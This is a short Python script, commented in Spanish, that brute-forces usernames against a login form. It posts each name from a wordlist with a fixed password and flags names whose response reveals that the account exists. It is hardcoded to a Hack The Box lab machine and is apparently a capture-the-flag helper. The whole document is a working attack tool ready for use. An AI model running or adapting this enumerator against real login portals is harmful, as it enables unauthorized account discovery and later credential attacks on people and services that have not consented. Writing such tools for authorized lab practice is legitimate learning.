#!/usr/bin/python3
#Enumera usuarios cuando el portal muestra un mensaje diferente cuando el usuario existe de cuando no.
#Ej: Maquina Shared de HTB
from pwn import *
import requests

if len(sys.argv) < 2:
    print(f"\n[\033[1;31m-\033[1;37m] Uso: python3 {sys.argv[0]} <dicccionario>\n")
    sys.exit(1)

print("\n[\033[1;34m*\033[1;37m] Iniciando fuerza bruta")
target = "http://10.10.11.160:5000/login"
dictionary = open(sys.argv[1])
bar = log.progress("Probando usuario")
time.sleep(1)

for line in dictionary:
    username = line.strip()
    data = {'username': username,'password':'password'}
    request = requests.post(target, data=data)
    bar.status("%s" % (username))
    response = request.text
    if "Invalid login" in response:
        print(f"[\033[1;32m+\033[1;37m] El usuario {username} es válido\n")
